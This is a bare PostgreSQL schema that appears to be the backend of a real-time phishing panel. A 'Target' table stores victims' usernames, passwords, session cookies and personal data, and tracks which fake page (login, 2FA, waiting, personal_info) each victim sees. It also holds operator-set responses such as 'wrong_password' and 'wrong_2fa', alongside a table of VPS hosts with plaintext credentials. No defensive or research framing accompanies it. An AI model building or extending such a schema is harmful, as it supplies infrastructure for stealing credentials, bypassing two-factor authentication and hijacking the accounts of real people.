CREATE TABLE Client (
    clientId UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    stats INTEGER DEFAULT 0,
    nb_live_user INTEGER DEFAULT 0
);

CREATE TABLE VPS (
    id SERIAL PRIMARY KEY,
    clientId UUID REFERENCES Client(clientId) ON DELETE CASCADE,
    vps_ip INET NOT NULL,
    state TEXT CHECK (state IN ('active', 'inactive', 'error')) NOT NULL,
    username TEXT NOT NULL,
    password TEXT NOT NULL,
    os_system TEXT
);


CREATE TABLE Target (
    id SERIAL PRIMARY KEY,
    clientId UUID REFERENCES Client(clientId) ON DELETE CASCADE,
    metadata JSONB,
    username TEXT NOT NULL,
    password TEXT NOT NULL,
    page_state TEXT CHECK (page_state IN ('login', '2FA', 'waiting', 'personal_info')) NOT NULL,
    is_active BOOLEAN DEFAULT TRUE,
    session_cookie TEXT,
    client_user_hash TEXT,
    page_action TEXT CHECK (page_action IN ('wrong_password', 'wrong_2fa', 'wrong_personal_info')) NULL
);

CREATE TABLE Page (
    pageId SERIAL PRIMARY KEY,
    page_type TEXT NOT NULL,
    path TEXT NOT NULL
);

